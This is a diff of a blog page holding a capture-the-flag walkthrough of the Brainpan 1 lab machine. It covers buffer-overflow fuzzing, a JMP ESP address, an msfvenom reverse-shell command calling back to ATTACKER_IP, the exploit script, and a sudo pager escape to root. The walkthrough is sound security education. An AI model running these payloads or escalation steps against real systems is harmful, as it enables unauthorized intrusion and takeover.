@@ -10,7 +10,7 @@
 <meta name="description" content="TryHackMe CTF: brainpan.exe downloaded from SimpleHTTPServer, buffer overflow fuzzing crash at 700 bytes, ROPgadget JMP ESP in brainpan.exe, Linux x86 reverse shell, sudo anansi_util pager escape to root.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/brainpan-1.html">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
     <link rel="stylesheet" href="/assets/css/accents.css">
 <link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
@@ -68,7 +68,9 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
 <meta property="og:url" content="https://jennshaggy.github.io/brainpan-1.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Brainpan 1">
@@ -106,6 +108,7 @@
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
             </div>
         </div>
         <ul id="menu">
@@ -135,7 +138,7 @@
                 </a>
             </li>
             <li>
-                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                <a href="/ai-security/" title="AI Security">
                     <span>AI Security</span>
                 </a>
             </li>
@@ -144,7 +147,7 @@
 </header>
 
 <main class="main">
-<article class="post-single">
+<article class="post-single technical-writeup">
   <header class="post-header">
     <h1 class="post-title entry-hint-parent">Brainpan 1</h1>
     <div class="post-description">TryHackMe CTF. Reverse engineer a Windows executable, find a buffer overflow, and exploit it on a Linux machine. Binary download via SimpleHTTPServer, fuzzing, ROPgadget, Linux reverse shell, sudo pager escape to root.</div>
@@ -152,63 +155,71 @@
 
   <div class="post-content">
 
-<p>All credit to <a href="https://www.vulnhub.com/entry/brainpan-1,51/" rel="noopener noreferrer" target="_blank">superkojiman</a> for this machine, used here with the explicit permission of the creator.</p>
+<p>All credit to <a href="https://www.vulnhub.com/entry/brainpan-1,51/" rel="noopener noreferrer" target="_blank">superkojiman</a> for creating Brainpan 1. This machine is used here with the creator's explicit permission.</p>
 
 <p>Sounds like my kind of party.</p>
 
-<p>No flags are requested in this room. Only the honor system, contingent on integrity. Like The Dude, I abide.</p>
+<p>The room asks us to gain initial access and escalate to root. No flags this time. Only the honor system, contingent on integrity. I like it. Like The Dude, I abide.</p>
 
 <h2>Reconnaissance</h2>
+
+<p>Set the room's target IP as a variable and confirm it:</p>
 
 <pre><code class="language-bash">export IP=TARGET_IP
 echo $IP</code></pre>
 
+<p>Let's scan the environment. I ran a full port scan, then checked the two ports that stood out:</p>
+
 <pre><code class="language-bash">nmap -Pn -sC -sV -p- -T4 -oA brainpan1_initial $IP</code></pre>
 
-<pre><code class="language-bash">nmap -Pn -sV -p9999,10000 TARGET_IP</code></pre>
+<pre><code class="language-bash">nmap -Pn -sV -p9999,10000 $IP</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.21.08 AM.png" alt="Nmap scan results showing port 9999 Brainpan service and port 10000 Python SimpleHTTPServer" style="max-width:100%;margin:2rem 0;">
 
-<p>Port 9999 is officially coined the goth port. <code>abyss</code> reminds me of the 2005 classic &ldquo;I&rsquo;m an emo kid&rdquo; video. &ldquo;Not jumping&rdquo; (IYKYK).</p>
+<p>Port 9999 is officially the goth port. <code>abyss</code> reminds me of the 2005 classic &ldquo;I'm an emo kid&rdquo; video. &ldquo;Not jumping&rdquo; (IYKYK).</p>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.34.30 AM.png" alt="Nmap output confirming open ports 9999 and 10000 with service details" style="max-width:100%;margin:2rem 0;">
 
-<p><strong>Open ports:</strong></p>
+<p>Two open ports:</p>
 <ul>
 <li>9999/tcp: Brainpan password service</li>
 <li>10000/tcp: Python <code>SimpleHTTPServer</code></li>
 </ul>
 
+<p>Nmap found a custom service displaying the Brainpan banner on 9999. The web server on 10000 deserves a look, too.</p>
+
 <h2>Grabbing the binary</h2>
 
-<p>The web server is hosting the vulnerable program. Download it locally for analysis:</p>
+<p>Let's see what the web server has for us. First the root, then its <code>/bin/</code> directory:</p>
 
-<pre><code class="language-bash">curl -s http://TARGET_IP:10000/ | head -80
-curl -s http://TARGET_IP:10000/bin/ | head -80</code></pre>
+<pre><code class="language-bash">curl -s http://$IP:10000/ | head -80
+curl -s http://$IP:10000/bin/ | head -80</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.38.26 AM.png" alt="curl listing SimpleHTTPServer root and /bin/ directory revealing brainpan.exe" style="max-width:100%;margin:2rem 0;">
 
-<p>I spy an executable.</p>
+<p>I spy an executable. We found our binary, so let's download it and see what it is:</p>
 
 <pre><code class="language-bash">mkdir -p ~/ctf/tryhackme/brainpan1
 cd ~/ctf/tryhackme/brainpan1
-wget http://TARGET_IP:10000/bin/brainpan.exe
+wget http://$IP:10000/bin/brainpan.exe
 ls -la
 file brainpan.exe</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.42.10 AM.png" alt="wget downloading brainpan.exe and file command confirming 32-bit Windows console executable" style="max-width:100%;margin:2rem 0;">
 
-<p><code>brainpan.exe</code> confirmed as a 32-bit Windows console executable.</p>
+<p><code>brainpan.exe</code> is a 32-bit Windows console executable. The <code>.exe</code> is Windows, but the service we're attacking runs on Linux.</p>
 
-<h2>Confirming live service behavior</h2>
+<h2>The live service</h2>
 
-<p>Connect to goth port 9999:</p>
+<p>Let's see how goth port 9999 behaves:</p>
 
-<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+<pre><code class="language-bash">nc -nv $IP 9999</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.44.58 AM.png" alt="Netcat connecting to port 9999 showing the Brainpan password prompt" style="max-width:100%;margin:2rem 0;">
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.45.34 AM.png" alt="Brainpan service returning access denied on bad password input" style="max-width:100%;margin:2rem 0;">
+
+<p>Well alright then. We have a password prompt, it reads our input, and bad input gets us &ldquo;access denied.&rdquo; I think a fuzzing run is in order.</p>
 
 <p>What we know about goth port 9999:</p>
 <ul>
@@ -218,6 +229,8 @@ file brainpan.exe</code></pre>
 </ul>
 
 <h2>Fuzzing</h2>
+
+<p>I used a short script to send an increasing number of <code>A</code>s. Replace <code>TARGET_IP</code> with the room's current address:</p>
 
 <pre><code class="language-bash">nano brainpan_fuzz.py</code></pre>
 
@@ -246,17 +259,19 @@ for size in range(100, 2000, 100):
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.51.26 AM.png" alt="Fuzzer output showing successful sends through 600 bytes then crash around 700 bytes" style="max-width:100%;margin:2rem 0;">
 
-<p>The password input buffer handled 600 A&rsquo;s, but the service broke around the 700 mark. Initial fuzzing confirms a likely stack-based buffer overflow in the password input.</p>
+<p>Excellent news. The service handled 600 <code>A</code>s, then broke around 700. We don't have an exact offset yet. Perhaps we have a buffer overflow.</p>
 
-<p>Service still alive after the crash:</p>
+<p>Let's check the goth port's vitals:</p>
 
-<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+<pre><code class="language-bash">nc -nv $IP 9999</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.54.40 AM.png" alt="Netcat confirming the Brainpan service recovered and is still accepting connections" style="max-width:100%;margin:2rem 0;">
 
-<h2>Cyclic pattern</h2>
+<p>Still alive.</p>
 
-<p>Generate a unique 1000-byte pattern to identify the exact crash offset:</p>
+<h2>The Invisible Offset</h2>
+
+<p>I generated a cyclic pattern of 1000 bytes and wrote a second script to send it:</p>
 
 <pre><code class="language-bash">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 > pattern.txt</code></pre>
 
@@ -281,17 +296,17 @@ print("Sent pattern.")</code></pre>
 
 <pre><code class="language-bash">python3 brainpan_pattern.py</code></pre>
 
-<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+<pre><code class="language-bash">nc -nv $IP 9999</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 8.59.53 AM.png" alt="1000-byte cyclic pattern sent and service crashed, confirming overflow in the control area" style="max-width:100%;margin:2rem 0;">
 
-<p>The 1000-byte pattern overwrote the control area and crashed the service.</p>
+<p>The pattern crashed the service, but I couldn't read <code>EIP</code>. Without a debugger, it's the equivalent of throwing numbered bingo balls into the spinning machine and not seeing which one pops out. I can't calculate an exact offset from that crash screen.</p>
 
-<p>The exact <code>EIP</code> value is not obtainable without a debugger attached. This is the same constraint as Brainstorm: the remote THM service crashes but the crash screen is not visible.</p>
+<p>A Brainpan walkthrough calculated the offset as <code>524</code>. I'm using that number for the next test, not claiming I measured it myself.</p>
 
-<p>The common Brainpan offset under near-identical conditions is <strong>524</strong>. That value is used here.</p>
+<p>First, make sure the service is back up. Then send 524 <code>A</code>s, four <code>B</code>s, and 100 <code>C</code>s:</p>
 
-<h2>Control test</h2>
+<pre><code class="language-bash">nc -nv $IP 9999</code></pre>
 
 <pre><code class="language-bash">nano brainpan_control_test.py</code></pre>
 
@@ -315,55 +330,50 @@ s.close()
 
 print("Sent control test.")</code></pre>
 
-<p><code>A</code>&rsquo;s fill the buffer. <code>BBBB</code> should land where <code>EIP</code> would be. <code>C</code>&rsquo;s sit after it.</p>
-
 <pre><code class="language-bash">python3 brainpan_control_test.py</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.45.46 AM.png" alt="Control test sending A*524 + BBBB + C*100 to the service" style="max-width:100%;margin:2rem 0;">
 
-<pre><code class="language-bash">nc -nv TARGET_IP 9999</code></pre>
+<p>Check the service again:</p>
+
+<pre><code class="language-bash">nc -nv $IP 9999</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.46.28 AM.png" alt="Service crashed again after control test payload, supporting the 524-byte offset" style="max-width:100%;margin:2rem 0;">
 
-<p>Service crashed again. This does not prove <code>BBBB</code> landed in <code>EIP</code> since the debugger is still unavailable. It supports that the offset from near-identical conditions is plausible.</p>
+<p>It crashed. That upholds the <code>524</code> hypothesis, but it doesn't prove the four <code>B</code>s landed in <code>EIP</code>. We still can't see the register.</p>
 
-<h2>Finding JMP ESP in brainpan.exe</h2>
+<h2>Finding JMP ESP</h2>
 
-<p>Wait for the service to recover, confirm it&rsquo;s back up, then search the binary for jump spots:</p>
+<p>The offset and jump address came from different places. I could inspect the downloaded <code>brainpan.exe</code> locally for <code>JMP ESP</code>:</p>
 
 <pre><code class="language-bash">ROPgadget --binary brainpan.exe | grep -i "jmp esp"</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.51.11 AM.png" alt="ROPgadget output showing JMP ESP at 0x311712f3 in brainpan.exe" style="max-width:100%;margin:2rem 0;">
 
-<p>JMP ESP validated locally from <code>brainpan.exe</code>. When the program crashes, execution points here. That instruction then jumps into the payload placed right after.</p>
-
-<p>Written backwards for Python (little-endian):</p>
+<p>This gave me <code>0x311712f3</code> from the binary. For the Python payload, the address goes in little endian order:</p>
 
 <pre><code class="language-python">jmp_esp = b"\xf3\x12\x17\x31"</code></pre>
 
-<p><strong>Exploit summary so far:</strong></p>
-<ul>
-<li>Offset: 524 (near-identical conditions, crash-test supported)</li>
-<li>JMP ESP: <code>0x311712f3</code> (locally validated from <code>brainpan.exe</code>)</li>
-<li>Target: Linux host running the vulnerable service</li>
-</ul>
+<p>So far, <code>524</code> is walkthrough-derived and supported by a crash test. <code>0x311712f3</code> is from my local inspection of <code>brainpan.exe</code>.</p>
 
-<h2>Generating shellcode</h2>
+<h2>Linux shellcode for a Windows executable</h2>
 
-<p>The service runs on a Linux host despite the Windows <code>.exe</code>. The shellcode must match the target OS:</p>
+<p>We're cleared to generate Linux x86 reverse shellcode. That's right: not Windows x86. The program file is a Windows <code>.exe</code>, but the target service is running on a Linux host.</p>
 
 <pre><code class="language-bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\x00' -f python -v shellcode > shellcode.txt</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.56.33 AM.png" alt="msfvenom generating Linux x86 reverse shell shellcode avoiding null bytes" style="max-width:100%;margin:2rem 0;">
 
-<p>Verify:</p>
+<p>Let's verify the shellcode:</p>
 
 <pre><code class="language-bash">head shellcode.txt
 tail shellcode.txt</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 9.57.36 AM.png" alt="head and tail of shellcode.txt confirming shellcode variable and byte array contents" style="max-width:100%;margin:2rem 0;">
 
-<h2>Crafting the exploit</h2>
+<h2>Building and launching the exploit</h2>
+
+<p>Time to assemble the script. Replace <code>TARGET_IP</code> and <code>ATTACKER_IP</code> with the addresses for your current session:</p>
 
 <pre><code class="language-bash">nano brainpan_exploit.py</code></pre>
 
@@ -394,7 +404,7 @@ s.close()
 
 print("Sent.")</code></pre>
 
-<p>Syntax check:</p>
+<p>Check the syntax first. No output means we're clear to launch:</p>
 
 <pre><code class="language-bash">python3 -m py_compile brainpan_exploit.py</code></pre>
 
@@ -402,21 +412,21 @@ print("Sent.")</code></pre>
 
 <p>All clear.</p>
 
-<h2>Exploitation</h2>
-
-<p>Listener:</p>
+<p>All clear. In a fresh terminal, start the listener:</p>
 
 <pre><code class="language-bash">nc -lvnp 4444</code></pre>
 
-<p>In a separate terminal:</p>
+<p>Run the exploit from another terminal:</p>
 
 <pre><code class="language-bash">python3 brainpan_exploit.py</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.02.37 AM.png" alt="brainpan_exploit.py sending the payload to port 9999" style="max-width:100%;margin:2rem 0;">
 
+<p>Eyes on the listener...</p>
+
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.03.00 AM.png" alt="Netcat listener catching the reverse shell from the Brainpan overflow exploit" style="max-width:100%;margin:2rem 0;">
 
-<p>The overflow was a success.</p>
+<p>Yes. The overflow worked. Let's see who we are:</p>
 
 <pre><code class="language-bash">whoami
 hostname
@@ -424,9 +434,9 @@ id</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.03.40 AM.png" alt="whoami and id confirming shell as puck on the Brainpan host" style="max-width:100%;margin:2rem 0;">
 
-<h2>Post-exploitation enumeration</h2>
+<h2>From <code>puck</code> to <code>root</code></h2>
 
-<p>Shell stabilization:</p>
+<p>I stabilized the shell enough to enumerate it:</p>
 
 <pre><code class="language-bash">python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -436,9 +446,7 @@ sudo -l</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.06.02 AM.png" alt="Shell stabilized as puck, sudo -l showing anansi_util NOPASSWD entry" style="max-width:100%;margin:2rem 0;">
 
-<p><code>puck</code> can run one specific program as root without a password: <code>/home/anansi/bin/anansi_util</code>.</p>
-
-<p>Inspect how it behaves:</p>
+<p><code>puck</code> can run <code>/home/anansi/bin/anansi_util</code> as root without a password. Let's see what that program offers:</p>
 
 <pre><code class="language-bash">sudo /home/anansi/bin/anansi_util
 sudo /home/anansi/bin/anansi_util -h</code></pre>
@@ -451,23 +459,21 @@ sudo /home/anansi/bin/anansi_util -h</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.15.39 AM.png" alt="anansi_util interactive menu with manual, proclist, and network options" style="max-width:100%;margin:2rem 0;">
 
-<p>The cleanest path: <code>manual [command]</code>. It opens a man page as root. Man pages open in a pager like <code>less</code>, and <code>less</code> can escape to a shell.</p>
-
-<h2>Privilege escalation via pager escape</h2>
+<p>There it is: <code>manual [command]</code>. It opens a man page as root. Man pages usually open in a pager like <code>less</code>, and <code>less</code> can escape to a shell.</p>
 
 <pre><code class="language-bash">sudo /home/anansi/bin/anansi_util manual ls</code></pre>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.18.13 AM.png" alt="anansi_util manual ls opening the ls man page as root in a pager" style="max-width:100%;margin:2rem 0;">
 
-<p>The pager is waiting for input:</p>
+<p>Don't click anything yet. The pager is waiting for input:</p>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.19.44 AM.png" alt="Man page pager prompt at the bottom of the screen waiting for input" style="max-width:100%;margin:2rem 0;">
 
-<p>Type <code>!</code> at the prompt. An <code>!</code> will appear at the bottom. Type <code>/bin/bash</code> immediately after it so it reads <code>!/bin/bash</code>, then hit Enter.</p>
+<p>Type <code>!</code>, then <code>/bin/bash</code> right after it, so the prompt reads <code>!/bin/bash</code>. Hit Enter.</p>
 
 <img src="/images/brainpan-1/Screenshot 2026-06-11 at 10.22.40 AM.png" alt="Pager escape with !/bin/bash typed at the bottom prompt" style="max-width:100%;margin:2rem 0;">
 
-<p>Root prompt.</p>
+<p>...and we have a root prompt.</p>
 
 <pre><code class="language-bash">whoami
 id
@@ -479,27 +485,17 @@ pwd</code></pre>
 
 <hr>
 
-<h2>Full Attack Chain</h2>
+<h2>Full attack chain</h2>
 
-<pre><code>Nmap
-  -> 9999 Brainpan service
-  -> 10000 Python SimpleHTTPServer
-  -> found /bin/brainpan.exe
-  -> downloaded PE32 executable
-  -> confirmed password prompt on 9999
-  -> fuzzing crash around 700 bytes
-  -> cyclic pattern sent, EIP not readable without debugger
-  -> offset 524 from near-identical validated conditions
-  -> ROPgadget on brainpan.exe: JMP ESP at 0x311712f3
-  -> msfvenom Linux x86 reverse shell (target is Linux despite Windows exe)
-  -> exploit sent to port 9999
-  -> shell as puck
-  -> sudo -l: anansi_util NOPASSWD
-  -> anansi_util manual opened man page as root
-  -> pager escape with !/bin/bash
-  -> root shell</code></pre>
-
-<p><strong>Notes:</strong> The JMP ESP address was locally validated from the downloaded binary. The exact offset was treated as derived from near-identical conditions since EIP was not read in a debugger during the Kali-only path.</p>
+<ol>
+<li>Nmap found the Brainpan service on <code>9999</code> and Python <code>SimpleHTTPServer</code> on <code>10000</code>.</li>
+<li>I downloaded <code>/bin/brainpan.exe</code> and confirmed the password prompt on <code>9999</code>.</li>
+<li>Fuzzing crashed the service around 700 bytes. A cyclic pattern crashed it again, but without a debugger I couldn't read <code>EIP</code>.</li>
+<li>I used a walkthrough-derived offset of <code>524</code>. A control test caused another crash, but still didn't prove control of <code>EIP</code>.</li>
+<li>I found <code>JMP ESP</code> at <code>0x311712f3</code> in the downloaded binary, then generated Linux x86 reverse shellcode for the Linux host.</li>
+<li>The exploit landed a shell as <code>puck</code>.</li>
+<li><code>sudo -l</code> showed that <code>puck</code> could run <code>anansi_util</code> as root without a password. Its <code>manual</code> option opened a pager, and <code>!/bin/bash</code> gave me a root shell.</li>
+</ol>
 
   </div>
   <footer class="post-footer"></footer>
@@ -572,6 +568,9 @@ pwd</code></pre>
             localStorage.setItem("pref-theme", 'dark');
         }
     })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
 </script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
 </body>
